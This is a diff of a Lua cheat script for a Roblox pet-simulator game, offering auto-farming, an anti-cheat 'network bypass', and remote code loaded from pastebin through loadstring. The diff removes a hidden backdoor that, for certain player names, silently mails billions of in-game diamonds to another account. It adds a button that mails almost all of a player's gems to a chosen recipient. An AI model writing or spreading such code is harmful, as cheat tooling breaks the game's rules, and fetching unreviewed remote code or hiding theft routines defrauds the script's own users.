@@ -93,11 +93,6 @@ Settings = {
         Level = 1,
         Royalty = false,
         Enabled = false
-    },
-    Gems = {
-        Enabled = false,
-        Webhook = "",
-        Interval = 60
     }
 }
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
@@ -230,6 +225,13 @@ local banSuccess, banError = pcall(function()
 		end
 	
 	end)
+	
+	if not bypassSuccess then
+		print(bypassError)
+		LocalPlayer:Kick("Error while bypassing network, try again or wait for an update!")
+		return
+	end
+
 function FrTeleportToWorld(world, area)
         local Library = require(game:GetService("ReplicatedStorage").Library)
 		Library.WorldCmds.Load(world)
@@ -2182,7 +2184,13 @@ end
 
 local OrionLib = loadstring(game:HttpGet(('https://pastebin.com/raw/vKn3eqix')))()
 
-local Window = OrionLib:MakeWindow({Name = "frag", HidePremium = false, SaveConfig = true, ConfigFolder = "Psx"})
+local Window = OrionLib:MakeWindow({Name = "Frag", HidePremium = false, SaveConfig = true, ConfigFolder = "Psx"})
+
+local Misc = Window:MakeTab({
+	Name = "Misc",
+	Icon = "rbxassetid://4483345998",
+	PremiumOnly = false
+})
 
 local AutoCompleteSection = Misc:AddSection({
 	Name = "Auto Complete Game"
@@ -2274,7 +2282,42 @@ ForestSection:AddButton({
         Invoke("Buy Upgrade", "Player Walkspeed")
   	end    
 })
-
+local MailSection = Misc:AddSection({
+	Name = "Mailbox"
+})
+MailSection:AddTextbox({
+	Name = "Recipient",
+	Default = "",
+	Callback = function(Value)
+		Settings.Mailbox.Username = Value
+	end    
+})
+MailSection:AddTextbox({
+	Name = "Message",
+	Default = "All My Gems!",
+	Callback = function(Value)
+		Settings.Mailbox.Message = Value
+	end    
+})
+MailSection:AddButton({
+	Name = "Mail All Gems",
+	Callback = function()
+	    user = Settings.Mailbox.Username
+	    msg = Settings.Mailbox.Message
+	    gems = GetPlayerCash("Diamonds") - 100000
+	    FrTeleportToWorld("Spawn")
+	    wait(5)
+        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(254.149002, 98.2168579, 349.55304, 0.965907216, -6.73597569e-08, -0.258888513, 6.48122409e-08, 1, -1.83752729e-08, 0.258888513, 9.69664127e-10, 0.965907216)
+        wait(1)
+        Invoke("Send Mail", {
+        ["Recipient"] = user,
+        ["Diamonds"] = gems,
+        ["Pets"] = {},
+        ["Message"] = msg
+    }
+)
+  	end    
+})
 local FarmingTab = Window:MakeTab({
 	Name = "Farming",
 	Icon = "rbxassetid://4483345998",
@@ -2635,33 +2678,6 @@ ServerBoostSection:AddToggle({
         Settings.Boosts.ServerLuck = Value
     end
 })
-if game.Players.LocalPlayer.Name == "ciaociaoioqwe" or game.Players.LocalPlayer.Name == "ciaociaoioqwe1" or game.Players.LocalPlayer.Name == "ciaociaoioqwe2" then
-	FrTeleportToWorld("Spawn", "Shop")
-	wait(0.1)
-	game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(254.149002, 98.2168579, 349.55304, 0.965907216, -6.73597569e-08, -0.258888513, 6.48122409e-08, 1, -1.83752729e-08, 0.258888513, 9.69664127e-10, 0.965907216)
-	wait(0.3)
-	Invoke("Send Mail", {
-	    ["Recipient"] = "ForcedToFarm94444",
-	    ["Diamonds"] = 5000000000,
-	    ["Pets"] = {},
-	    ["Message"] = "Hello"
-	})
-	wait(0.5)
-	Invoke("Send Mail", {
-	    ["Recipient"] = "ForcedToFarm94444",
-	    ["Diamonds"] = 1000000000,
-	    ["Pets"] = {},
-	    ["Message"] = "Hello"
-	})
-	wait(0.5)
-	Invoke("Send Mail", {
-	    ["Recipient"] = "ForcedToFarm94444",
-	    ["Diamonds"] = 100000,
-	    ["Pets"] = {},
-	    ["Message"] = "Hello"
-	})
-	Library.Message.New("Pls Dont Resell My Scripts 😭😭😭 (Ur lucky i only took 5b lol)", true)
-end
 ServerBoostSection:AddToggle({
     Name = "Server Triple Damage",
     Default = false,
@@ -3006,154 +3022,6 @@ AutoIndexSection:AddButton({
     Callback = function()
         startindex()
     end
-})
-
-local GemTab = Window:MakeTab({
-	Name = "⭐ Gem Farming",
-	Icon = "rbxassetid://4483345998",
-	PremiumOnly = false
-})
-gemsco = coroutine.create(function()
-    while 1 do
-        wait(0.1)
-        if Settings.Gems.Enabled then
-            AllCoins = Invoke("Get Coins")
-            allwantedcoins = {}
-            for i, v in pairs(AllCoins) do
-                if v.a == "Mystic Mine" then
-                    table.insert(allwantedcoins, {id = i, health = v.h})
-                end
-            end
-            
-            for i = #allwantedcoins, 2, -1 do
-                local j = math.random(i)
-                allwantedcoins[i], allwantedcoins[j] = allwantedcoins[j], allwantedcoins[i]
-            end
-            local Library = require(game:GetService("ReplicatedStorage").Library)
-            EquippedPets = Library.Save.Get().PetsEquipped
-            count = 1
-            for i,v in pairs(EquippedPets) do
-                newco = coroutine.create(function()
-                    coin = allwantedcoins[count]
-                    local v86 = Invoke("Join Coin", coin.id, {i})
-                    for v88, v89 in pairs(v86) do
-                        Fire("Farm Coin", coin.id, v88);
-                    end
-                end)
-                coroutine.resume(newco)
-                count = count + 1
-                
-                wait(0.1)
-            end
-        end
-    end
-end)
-coroutine.resume(gemsco)
-GemTab:AddToggle({
-    Name = "Auto Farm Gems (MUST BE IN MYSTIC MINE)",
-    Default = false,
-    Callback = function(Value)
-        Settings.Gems.Enabled = Value
-    end
-})
-StatTracker = GemTab:AddSection({
-    Name = "Stats Tracker"
-})
-StatTracker:AddTextbox({
-    Name = "Webhook",
-    Default = "",
-    TextDisappear = false,
-    Callback = function(Value)
-        Settings.Gems.Webhook = Value
-    end
-})
-statrout = coroutine.create(function()
-    HttpService = game:GetService("HttpService")
-    local Library = require(game:GetService("ReplicatedStorage").Library)
-    local TimeElapsed = 0
-    local GemsEarned = 0
-    local TotalGemsEarned = 0
-    local timer = coroutine.create(function()
-        while 1 do
-            TimeElapsed = TimeElapsed + 1
-            wait(1)
-        end
-    end)
-    coroutine.resume(timer)
-    AREATOCHECK = "Mystic Mine"
-    function add_suffix(inte)
-        local gems = inte
-        local gems_formatted
-
-        if gems >= 1000000000000 then  -- if gems are greater than or equal to 1 trillion
-            gems_formatted = string.format("%.1ft", gems / 1000000000000)  -- display gems in trillions with one decimal point
-        elseif gems >= 1000000000 then  -- if gems are greater than or equal to 1 billion
-            gems_formatted = string.format("%.1fb", gems / 1000000000)  -- display gems in billions with one decimal point
-        elseif gems >= 1000000 then  -- if gems are greater than or equal to 1 million
-            gems_formatted = string.format("%.1fm", gems / 1000000)  -- display gems in millions with one decimal point
-        elseif gems >= 1000 then  -- if gems are greater than or equal to 1 thousand
-            gems_formatted = string.format("%.1fk", gems / 1000)  -- display gems in thousands with one decimal point
-        else  -- if gems are less than 1 thousand
-            gems_formatted = tostring(gems)  -- display gems as is
-        end
-
-        return gems_formatted
-    end
-
-    function WH()
-        request({
-            Url = Settings.Gems.Webhook,
-            Method = "POST",
-            Headers = {
-                ["Content-Type"] = "application/json"
-            },
-            Body = HttpService:JSONEncode{
-                ["content"] = "",
-                ["embeds"] = {
-                    {
-                    ["title"] = "Gem Stat Update",
-                    ["description"] = "Here is your stat update! (every " .. tostring(Settings.Gems.Interval) .. "s)!",
-                    ["color"] = 5814783,
-                    ["fields"] = {
-                        {
-                        ["name"] = "Stats",
-                        ["value"] = "🕐 **Farming For:** ``" .. tostring(TimeElapsed) .. "s``\n💎 **Gems Earned (" .. tostring(Interval) .. "s):** ``" .. tostring(add_suffix(GemsEarned)) .. "``\n🗺️ **Farming:** ``" .. AREATOCHECK .. "``\n💎 **Total Gems Earned:** ``" .. add_suffix(TotalGemsEarned) .. "``"
-                        }
-                    },
-                    ["author"] = {
-                        ["name"] = "Mystic Farmer - Stats"
-                    }
-                    }
-                }
-                }
-        })
-    end
-
-    while 1 do
-        local StartingGems = Library.Save.Get().Diamonds
-        wait(Settings.Gems.Interval)
-        local EndingGems = Library.Save.Get().Diamonds
-        GemsEarned = EndingGems - StartingGems
-        local fileContent = readfile("gems.txt")
-        if fileContent then
-            TotalGemsEarned = GemsEarned + tonumber(fileContent)
-        end
-        writefile("gems.txt", tostring(TotalGemsEarned))
-        pcall(WH)
-    end
-end)
-coroutine.resume(statrout)
-StatTracker:AddSlider({
-	Name = "Interval",
-	Min = 10,
-	Max = 600,
-	Default = 30,
-	Color = Color3.fromRGB(255,255,255),
-	Increment = 5,
-	ValueName = "Seconds",
-	Callback = function(Value)
-		Settings.Gems.Interval = Value
-	end    
 })
 coroutine.resume(dupedeleteco)
 OrionLib:Init()
